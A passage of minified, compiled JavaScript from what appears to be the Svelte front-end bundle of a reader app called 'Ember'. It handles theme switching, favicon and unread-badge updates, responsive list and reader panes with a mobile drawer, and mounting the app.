T(){document.hidden||Aa()}Gi(async()=>{f=La(x),window.addEventListener(`ember:unauthorized`,S),window.addEventListener(`ember:open-settings`,C),document.addEventListener(`visibilitychange`,T);try{F(_,localStorage.getItem(g)===`1`)}catch{}xa();try{await $i()}catch{}F(p,!0)});function E(){F(_,!0);try{localStorage.setItem(g,`1`)}catch{}}Ki(()=>{f(),window.removeEventListener(`ember:unauthorized`,S),window.removeEventListener(`ember:open-settings`,C),document.removeEventListener(`visibilitychange`,T),te()});let ne=P(null);Vn(()=>{n()&&n().id!==V(ne)?(F(ne,n().id,!0),ca().then(()=>{F(v,!0)}),ja(ft(da)),ee()):n()||(F(ne,null),F(v,!1),te())});let re=P(hn(typeof window<`u`&&window.matchMedia?.(`(prefers-color-scheme: dark)`).matches));Vn(()=>{if(typeof window>`u`)return;let e=window.matchMedia(`(prefers-color-scheme: dark)`),t=e=>F(re,e.matches,!0);return e.addEventListener(`change`,t),()=>e.removeEventListener(`change`,t)}),Vn(()=>{let e=document.querySelector(`link[rel="icon"]`);e&&Ja(r().favicon_url?r().favicon_url:V(re)?`/ember/demo/icon-dark.svg`:`/ember/demo/icon.svg`,i()>0).then(t=>{t.startsWith(`data:image/png`)&&e.removeAttribute(`type`),e.href=t})}),Vn(()=>{let e=r().page_title||r().name||`Ember`;document.title=i()>0?`(${i()}) ${e}`:e}),Vn(()=>{if(typeof navigator>`u`)return;let e=navigator;i()>0&&typeof e.setAppBadge==`function`?e.setAppBadge(i()).catch(()=>{}):typeof e.clearAppBadge==`function`&&e.clearAppBadge().catch(()=>{})});let D=P(hn(typeof window<`u`&&window.matchMedia?.(`(prefers-color-scheme: dark)`).matches)),O=P(hn(typeof window<`u`&&window.matchMedia?.(`(max-width: 900px)`).matches));Vn(()=>{if(typeof window>`u`)return;let e=window.matchMedia(`(max-width: 900px)`),t=e=>F(O,e.matches,!0);return e.addEventListener(`change`,t),()=>e.removeEventListener(`change`,t)});let ie=P(!1),ae=Qt(()=>a()===null?`list`:`reader`);function oe(){fa.set(null)}Vn(()=>{if(typeof window>`u`)return;let e=window.matchMedia(`(prefers-color-scheme: dark)`),t=e=>F(D,e.matches,!0);return e.addEventListener(`change`,t),()=>e.removeEventListener(`change`,t)}),Vn(()=>{let e=o()===`auto`?V(D)?`dark`:`light`:o();document.documentElement.dataset.theme=e;try{localStorage.setItem(`ember:theme`,o())}catch{}}),Vn(()=>{if(o()!==`custom`){document.documentElement.style.removeProperty(`--paper`),document.documentElement.style.removeProperty(`--ink`),document.documentElement.style.removeProperty(`--ember`),document.documentElement.style.removeProperty(`--link`);return}document.documentElement.style.setProperty(`--paper`,s().paper),document.documentElement.style.setProperty(`--ink`,s().ink),document.documentElement.style.setProperty(`--ember`,s().ember),s().link?document.documentElement.style.setProperty(`--link`,s().link):document.documentElement.style.removeProperty(`--link`)});var se=mu(),ce=L(se),le=e=>{var t=cu(),n=L(t);au(n,{}),su(R(n,2),{}),W(e,t)};K(ce,e=>{e(le)});var ue=R(ce,2),de=e=>{W(e,lu())},fe=e=>{bo(e,{})},pe=e=>{var t=pu(),r=L(t);let i;var a=I(r);{let e=Qt(()=>V(O)&&V(ae)===`reader`);mc(a,{onOpenSettings:()=>F(h,!0),get mobile(){return V(O)},onToggleMobileSidebar:()=>F(ie,!V(ie)),get showBack(){return V(e)},onBack:oe})}var s=R(a,2);let u;var d=I(s),f=e=>{var t=du(),n=L(t),r=e=>{var t=uu();H(`click`,t,()=>F(ie,!1)),W(e,t)};K(n,e=>{V(ie)&&e(r)});var i=R(n,2);let a;Xo(I(i),{}),j(i);var o=R(i,2),s=e=>{fs(e,{})},c=e=>{Js(e,{})};K(o,e=>{V(ae)===`list`?e(s):e(c,-1)}),z(()=>a=q(i,1,`mobile-drawer svelte-1n46o8q`,null,a,{open:V(ie)})),W(e,t)},p=e=>{var t=fu(),n=L(t),r=e=>{Xo(e,{})};K(n,e=>{c()||e(r)});var i=R(n,2);fs(i,{}),Js(R(i,2),{}),W(e,t)};K(d,e=>{V(O)?e(f):e(p,-1)}),j(s),j(r);var g=R(r,2),y=e=>{_c(e,{onClose:()=>F(m,!1)})};K(g,e=>{V(m)&&e(y)});var b=R(g,2),x=e=>{tu(e,{onClose:()=>F(h,!1)})};K(b,e=>{V(h)&&e(x)});var S=R(b,2),C=e=>{ru(e,{onClose:E})};K(S,e=>{n()&&V(v)&&l().length===0&&!V(_)&&e(C)}),z(()=>{i=q(r,1,`shell svelte-1n46o8q`,null,i,{mobile:V(O)}),Y(r,`data-theme`,o()),u=q(s,1,`panes svelte-1n46o8q`,null,u,{"sidebar-collapsed":c(),mobile:V(O),"drawer-open":V(O)&&V(ie)}),Y(s,`data-mobile-pane`,V(ae))}),W(e,t)};K(ue,e=>{V(p)?n()?e(pe,-1):e(fe,1):e(de)}),W(e,se),Je(),d()}go();var gu=document.getElementById(`app`);if(!gu)throw Error(`missing #app root`);ei(hu,{target:gu});
